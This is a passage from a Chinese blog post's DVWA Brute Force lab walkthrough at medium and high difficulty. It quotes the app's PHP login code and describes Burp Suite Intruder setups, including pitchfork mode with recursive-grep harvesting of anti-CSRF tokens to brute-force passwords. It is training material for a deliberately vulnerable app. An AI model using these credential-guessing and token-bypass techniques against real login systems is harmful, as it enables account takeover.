$___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>比起low级别的代码，medium里面添加了这一部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br></pre></td></tr></table></figure>

<p>mysql_real_escape_string这个函数会对字符串中的特殊符号（x00,n,r,’,”,x1a）进行转义，基本上能够抵御sql注入攻击。所以这里我们只用Burpsuite进行暴力破解。</p>
<p>步骤跟low难度里面的一样。</p>
<p>先打开DVWA,设置好代理，然后输入账号密码经行抓包。获取到如下内容</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/14.png" alt=""></p>
<p>发送到intruder进行破解，先加入密码本</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/15.png" alt=""></p>
<p>然后用sniper进行破解，找到不一样的那一串</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/16.png" alt=""></p>
<p>所以密码为password,在DVWA上登陆成功</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/17.png" alt=""></p>
<h2 id="三-high"><a href="#三-high" class="headerlink" title="三.high"></a>三.high</h2><p>首先进行代码审计，在DVWA目录下找到Brute Force文件夹，查看它的核心代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">	checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Sanitise username input</span><br><span class="line">	$user &#x3D; $_GET[ &#39;username&#39; ];</span><br><span class="line">	$user &#x3D; stripslashes( $user );</span><br><span class="line">	$user &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Sanitise password input</span><br><span class="line">	$pass &#x3D; $_GET[ &#39;password&#39; ];</span><br><span class="line">	$pass &#x3D; stripslashes( $pass );</span><br><span class="line">	$pass &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Check database</span><br><span class="line">	$query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">	$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">	if( $result &amp;&amp; mysqli_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">		&#x2F;&#x2F; Get users details</span><br><span class="line">		$row    &#x3D; mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar &#x3D; $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Login successful</span><br><span class="line">		$html .&#x3D; &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">		$html .&#x3D; &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		&#x2F;&#x2F; Login failed</span><br><span class="line">		sleep( rand( 0, 3 ) );</span><br><span class="line">		$html .&#x3D; &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将DVWA调至high级别，发现用之前的暴力破解就不好使了，因为其使用了随机token机制来防止CSRF，使用了stripslashes函数和mysqli_real_esacpe_string来抵御SQL注入和XSS的攻击，从而在一定程度上防止了重放攻击，增加了爆破难度。但是依然可以使用burpsuite来爆破。</p>
<p>1.用burpsuite进行拦截，发现新增加了user_token参数，所以我们需要选择两个参数进行爆破。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/18.png" alt=""></p>
<p>2.设置两个参数password和user_token为变量，攻击类型选择pitchfork–它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload.</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/19.png" alt=""></p>
<p>3.在options里面设置参数，启用Grep-Extract,用于提取相应消息中的有用信息，点击Add,然后按下图设置。最后，将Redirections设置为Always。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/20.png" alt=""></p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/21.png" alt=""></p>
<p>4.在payload中，第一个参数跟之前一样添加字典</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/22.png" alt=""></p>
<p>第二个参数,类型选择为Recursive grep–表示将服务器每次返回的数据来替换payload中的变量值，这里用来每次替换user_token的值。再将下面的初值设为token当前的值。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/23.png" alt=""></p>
<p>5.进行暴力破解，找到密码。</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/brute%20force/24.png" alt=""></p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/22/Brute%20Force/" data-id="ck4gpkcpi0000zgvocpp92tdp"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
  </article>
  

  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2015-2020
        John Doe
      </li>
      <li>
        
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a> by shenyu
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
        
        <ul class="list-inline">
  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
</ul>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
    
      <aside class="sidebar">
        
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">目录</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="http://shenyu-vip.lofter.com" target="_blank" rel="noopener">摄影</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2019/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>





<script>
  var ayerConfig = {
    mathjax: false
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">



<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  
  
  </div>
</body>

</html>